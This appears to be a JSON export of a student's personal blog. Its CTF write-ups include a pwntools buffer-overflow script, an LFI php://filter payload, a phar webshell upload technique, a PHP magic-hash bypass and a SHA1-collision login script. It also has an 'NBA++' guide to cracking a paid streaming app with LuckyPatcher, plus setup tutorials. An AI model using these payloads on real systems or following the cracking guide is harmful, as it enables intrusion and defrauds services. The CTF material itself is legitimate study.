{"meta":{"title":"Racter's Blogs","subtitle":"Racter","description":"Writeups & Diaries","author":"Racter Liu","url":"https://racterub.com.tw"},"pages":[{"title":"About","date":"2017-05-09T14:30:03.000Z","updated":"2017-10-04T02:33:49.479Z","comments":true,"path":"about/index.html","permalink":"https://racterub.com.tw/about/index.html","excerpt":"","text":"作者劉軒佑學校: 桃園高中 二年級經歷: HITCON 2016 Attendee Cyber Defence Exercise Attendee AIS3 2017 CTF隊伍: n00bCTF程式語言: python 興趣: CTF Reverse Engineering Forensic Pwn Binary Exploitation 未來目標: 跟上HITCON前輩們的腳步 programming language C or C++ some web-design framework"},{"title":"Categories","date":"2017-10-04T02:33:49.479Z","updated":"2017-10-04T02:33:49.479Z","comments":true,"path":"categories/index.html","permalink":"https://racterub.com.tw/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2017-10-04T02:33:49.487Z","updated":"2017-10-04T02:33:49.487Z","comments":true,"path":"tags/index.html","permalink":"https://racterub.com.tw/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"HITCON2017-Bamboofox Wargame","slug":"hitcon2017-bamboofox","date":"2017-08-25T23:02:43.000Z","updated":"2017-10-04T02:33:49.479Z","comments":true,"path":"zh-tw/hitcon2017-bamboofox/","link":"","permalink":"https://racterub.com.tw/zh-tw/hitcon2017-bamboofox/","excerpt":"","text":"只解出兩題, 剩下的因為我太廢不會繞保護所以沒解QQ Forensic [100]Description:1234聽說他被裁剪過，不過好像不是用正規的圖片編輯軟體處理的，真是的...怎麼裁剪的這麼暴力...拜託了，幫我把旗子找出來，不然...等等有人來了...快躲起來...( 瀏覽器上面瀏覽可能是黑的，建議載下來看喔 ) 題目檔: Height_is_weird 這題題目已經提示要改圖片高度所以在hexeditor中找到png的寬高設定 png格式說明書所以把高增加到想要的高度(in HEX)然後再用pngcheck把CRC重新算一遍再更正就可以囉 Pwn [100]Description:12345678910nc bamboofox.cs.nctu.edu.tw 22001FLAG 在 /home/ctf 底下歡迎來到 PWN 的世界恩...這題就是 buffer overflow 的基礎簡單入門題有哪邊不會可以來我們在 HITCON 的攤位問問題喔會的人應該 1 分鐘就解完了吧?恩我廢話好多喔...總之就是想辦法拿到 FLAG 吧 主辦方很佛心地給了src題目檔: binary100.c binary100 這題題目很好心的給了原始碼 那就不開gdb了 這題題目是考LIFO+BOF在記憶體裡長這樣:123456789+----------------+| || || text | &lt;-- text&apos;s buffer (40byte)| || || -------------- || to_be_overflow | &lt;-- to_be_overflow&apos;s pointer+----------------+ 在程式中to_be_overflow必須等於0xABCD1234才有shell所以只要在text的buffer塞滿垃圾, 在把to_be_overflow蓋掉直接變成0xABCD1234就可以取得shell 所以payload會長這樣:123456789#!/usr/bin/env pythonfrom pwn import *r = remote('bamboofox.cs.nctu.edu.tw', '22001')r.sendline('A'*40 + '\\x34\\x12\\xCD\\xAB')r.interactive()","categories":[{"name":"Write-up","slug":"Write-up","permalink":"https://racterub.com.tw/categories/Write-up/"},{"name":"hitcon2017CMT","slug":"Write-up/hitcon2017CMT","permalink":"https://racterub.com.tw/categories/Write-up/hitcon2017CMT/"},{"name":"bamboofox","slug":"Write-up/hitcon2017CMT/bamboofox","permalink":"https://racterub.com.tw/categories/Write-up/hitcon2017CMT/bamboofox/"}],"tags":[{"name":"bamboofox","slug":"bamboofox","permalink":"https://racterub.com.tw/tags/bamboofox/"},{"name":"hitcon2017","slug":"hitcon2017","permalink":"https://racterub.com.tw/tags/hitcon2017/"}]},{"title":"Ubuntu-Fixes","slug":"ubuntu-fixes","date":"2017-08-13T13:02:20.000Z","updated":"2017-10-04T02:33:49.479Z","comments":true,"path":"zh-tw/ubuntu-fixes/","link":"","permalink":"https://racterub.com.tw/zh-tw/ubuntu-fixes/","excerpt":"","text":"最近在更新軟體包的時候出現files list file for package &#39;xxx&#39; is missing final newline的錯誤解法:123456789101112131415161718192021222324#!/usr/bin/python# 8th November, 2009# update manager failed, giving me the error:# 'files list file for package 'xxx' is missing final newline' for every package.# some Googling revealed that this problem was due to corrupt files(s) in /var/lib/dpkg/info/# looping though those files revealed that some did not have a final new line# this script will resolve that problem by appending a newline to all files that are missing it# NOTE: you will need to run this script as root, e.g. sudo python newline_fixer.py# http://ubuntuforums.org/showthread.php?t=1319791import osdpkg_path = '/var/lib/dpkg/info/'paths = os.listdir(dpkg_path)for path in paths: path = dpkg_path + path f = open(path, 'a+') data = f.read() if len(data) &gt; 1 and data[-1:] != '\\n': f.write('\\n') print 'added newline character to:', path f.close()(Gist Source) Updated at 2017.08.13","categories":[{"name":"Linux","slug":"Linux","permalink":"https://racterub.com.tw/categories/Linux/"},{"name":"Ubuntu","slug":"Linux/Ubuntu","permalink":"https://racterub.com.tw/categories/Linux/Ubuntu/"},{"name":"Bugfix","slug":"Linux/Ubuntu/Bugfix","permalink":"https://racterub.com.tw/categories/Linux/Ubuntu/Bugfix/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://racterub.com.tw/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://racterub.com.tw/tags/Linux/"}]},{"title":"AIS3 Pre-Exam 2017","slug":"ais3-2017","date":"2017-07-13T15:12:36.000Z","updated":"2017-10-04T02:33:49.475Z","comments":true,"path":"zh-tw/ais3-2017/","link":"","permalink":"https://racterub.com.tw/zh-tw/ais3-2017/","excerpt":"","text":"這次是我第一次玩AIS3 Pre-Exam,難度沒有特別難以web來說拉.解題的時候有卡了一下下實際上是一整天以下是有解出來的write-up FLAG和題目大多都忘記保存了QQ,所以這篇只寫出想法和大概解法QQ MISCMISC1只是個簽到題 MISC2這題的出題者給我出來QQ, 這花了我快一天的時間QQ題目只寫了頁面I&#39;ve sent you something :)一開始看原始碼一看就看到&lt;!-- &lt;img src=sudodu.png /&gt; --&gt;一開始的只覺得應該是個Stego題結果不論是用exiftool, binwalk, strings都沒有出現任何特別的地方直到有一次無聊喵了一下看到header發現有傳了一串類似以base64編碼的字串解出來後的確是base64編碼的,結果是一個資料夾, 資料夾裡面有一張照片下載下來即可發現FLAGFLAG = AIS3{pika} WEBWEB1題目只寫了Didn&#39;t You See The Flag?用curl就會噴FLAG了 WEB2題目為一個登入畫面,DB已經寫死在Source Code裡了看了一下Source Code是1md5(%password) == $row['password']後來Google了一下,發現是PHP==的一些問題(Source)(CTF實例)並且在DB找到了MD5編碼開頭為0e的密碼所以以0e編碼的明碼再加上相對應的username就可以取得flag WEB3 &amp; WEB4兩個是同一個網站 WEB3(Flag1)看了一下發現好像有LFI的漏洞就開始不斷的猜flag的位置猜了快一天才發現就在indexPAYLOAD = $domain/?p=php://filter/convert.base64-encode/resource=index WEB4(Flag2)看了一下index的內容發現Flag2的線索有個uploaddddddd的頁面發現可能是要上傳webshell但是不論怎麼試都不行過(改content-type, 雙副檔名)後來才知道要用phar的協定壓縮webshell成zip檔,改附檔名成.jpg,利用LFI+phar執行webshellthe_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l 這個頁面就放flag進去一看就可以看到Flag2 CRYPTOCRYPTO 3程式碼:(我不會寫php code QQ(意思有到就好))1234h1 = $_POST[\"username\"]h2 = $_POST[\"password\"]if h1 = h2; die $flag直覺就是SHA1 Collision(Source)在網路上改一下script就會噴出flag了1234567import requestsimport urllib2rotimi = urllib2.urlopen(\"http://shattered.io/static/shattered-1.pdf\").read()[:500]letmein = urllib2.urlopen(\"http://shattered.io/static/shattered-2.pdf\").read()[:500]payload = &#123;'username': rotimi, 'password': letmein&#125;r = requests.post('https://quiz.ais3.org:32670', data=payload)print r.text 總結這次AIS3的初體驗我覺得挺好玩的雖然只有127名QQ因為自己Reverse跟pwn的底子還不夠,所以打完web跟misc就不繼續打了明年希望自己能夠給力點QQ","categories":[{"name":"Write-up","slug":"Write-up","permalink":"https://racterub.com.tw/categories/Write-up/"},{"name":"AIS3","slug":"Write-up/AIS3","permalink":"https://racterub.com.tw/categories/Write-up/AIS3/"},{"name":"2017","slug":"Write-up/AIS3/2017","permalink":"https://racterub.com.tw/categories/Write-up/AIS3/2017/"}],"tags":[{"name":"AIS3","slug":"AIS3","permalink":"https://racterub.com.tw/tags/AIS3/"},{"name":"Writeu-up","slug":"Writeu-up","permalink":"https://racterub.com.tw/tags/Writeu-up/"}]},{"title":"Vagrant-Windows","slug":"vagrant-windows","date":"2017-05-24T14:03:38.000Z","updated":"2017-10-04T02:33:49.479Z","comments":true,"path":"zh-tw/vagrant-windows/","link":"","permalink":"https://racterub.com.tw/zh-tw/vagrant-windows/","excerpt":"","text":"前言本篇僅針對Windows教學,其他系統請去煩作者叫他生出來 本章將介紹虛擬機器的基本設定,並且介紹Vagrant的使用方法 需求 Windows系統 8GB RAM 以上 8GB 以上的儲存空間 腦袋 Cygwin和Git console請自行安裝 安裝程式我自己選用的是Virtual Box和Vagrant VirtualBox載點(要下載Extention Pack) Vagrant載點 Vagrant 基本介紹Vagrant, 是個基於Virtual Box所開發的一個介面, 它可以有系統的管理各種虛擬機器 Vagrant在管理系統的映像檔是以Box來管理, 它也可以自製Box來對其他人提供相同的環境對於不會使用Docker的人來說是個不錯的選擇 (個人覺得使用上有點像Docker, 但是Docker更好用(內部架構也完全不同)) 基本操作12345vagrant init //初始化環境vagrant up //啟動虛擬機vagrant reload //重啟虛擬機vagrant halt //關閉虛擬機vagrant box add xxxxx //新增xxxxx的Box(也可使用其他資源下載Box) Vagrantfile每個藉由Vagrant建立的虛擬機都會透過Vagrantfile來設定虛擬機 以下是我的Vagrantfile(僅供參考用, 各項設定請依自己的電腦配備做適當的更動) 以下是Vagrantfile相對應的解釋12345config.vm.box = &quot;bento/ubuntu-16.04&quot; //宣告該虛擬機的系統config.vm.network &quot;forwarded_port&quot;, guest: 80, host: 8080 //重導向portconfig.vm.network &quot;private_network&quot;, ip: &quot;192.168.33.10&quot; //設定內網IPconfig.vm.synced_folder &quot;../data&quot;, &quot;/vagrant_data&quot; //設定虛擬機與實體機所要同步的資料夾vb.memory = &quot;3072&quot; //設定虛擬機RAM大小 備註:共享資料夾預設是Vagrantfile的所在資料夾, 在虛擬系統內掛載為/vagrant SSH我自己習慣以ssh連到虛擬機(當然你也可以用Putty)SSH的方法有兩種 vagrant ssh這是要在虛擬機所屬的資料夾下才能使用 ssh xxxxx這是要設定ssh才可使用, 但是這在任何資料夾皆可用(個人偏向這個) SSH設定 (請先裝cygwin並且確認有裝ssh套件)在你虛擬機資料夾內下vagrant ssh-config --host $hostname$hostname是自己設定的把回應的結果複製起來接下來輸入以下指令:123456cd ~/mkdir .sshcd .sshtouch config#接下來把剛剛複製起來的貼在config裡面chmod 777 config接下來只要你有開虛擬機你就可以下ssh $hostname","categories":[{"name":"Enviroment","slug":"Enviroment","permalink":"https://racterub.com.tw/categories/Enviroment/"},{"name":"Vagrant","slug":"Enviroment/Vagrant","permalink":"https://racterub.com.tw/categories/Enviroment/Vagrant/"},{"name":"Windows","slug":"Enviroment/Vagrant/Windows","permalink":"https://racterub.com.tw/categories/Enviroment/Vagrant/Windows/"}],"tags":[{"name":"Vagrant","slug":"Vagrant","permalink":"https://racterub.com.tw/tags/Vagrant/"},{"name":"VirtualBox","slug":"VirtualBox","permalink":"https://racterub.com.tw/tags/VirtualBox/"}]},{"title":"NBA++","slug":"NBA++","date":"2017-05-06T10:21:41.000Z","updated":"2017-10-04T02:33:49.475Z","comments":true,"path":"en/NBA++/","link":"","permalink":"https://racterub.com.tw/en/NBA++/","excerpt":"","text":"NBA++AndroidPrepartion LuckyPatcher NBA++ Installaion1. Remove old NBA app2. Install Apps which provided in this article LuckyPatcher NBA++Files should be in download/ folder 3. Open LuckyPatcher wait till it stop processing4. Open NBA++, then go to LeaguePass page Choose the first method 5. After purchased LeaguePass, it should be Cracked. Enjoy your free NBA live stream!Updated at 2017.05.09 &#39;change storage domain","categories":[{"name":"Cracked apps","slug":"Cracked-apps","permalink":"https://racterub.com.tw/categories/Cracked-apps/"}],"tags":[{"name":"NBA","slug":"NBA","permalink":"https://racterub.com.tw/tags/NBA/"}]},{"title":"Setup-Enviroment","slug":"Setup-Enviroment","date":"2017-05-05T15:43:33.000Z","updated":"2017-10-04T02:33:49.475Z","comments":true,"path":"en/Setup-Enviroment/","link":"","permalink":"https://racterub.com.tw/en/Setup-Enviroment/","excerpt":"","text":"Basic SetupBase SystemUbuntu-16.04(bento) Tools for CTF Vim8.0 (with lots of plugins) My vimrc strace ltrace z3 GDB with scwuaptx’s Enhancement GDB peda Pwngdb pwntools ROPgadget qira binwalk bash-completion Screenshots Vim with Tmux Installation12345cd ~/git clone https://github.com/staracg/Ubuntu-Env.gitcd Ubuntu-Envchmod +x install.sh./install.sh","categories":[{"name":"Enviroment","slug":"Enviroment","permalink":"https://racterub.com.tw/categories/Enviroment/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://racterub.com.tw/tags/Ubuntu/"},{"name":"Enviroment","slug":"Enviroment","permalink":"https://racterub.com.tw/tags/Enviroment/"}]}]}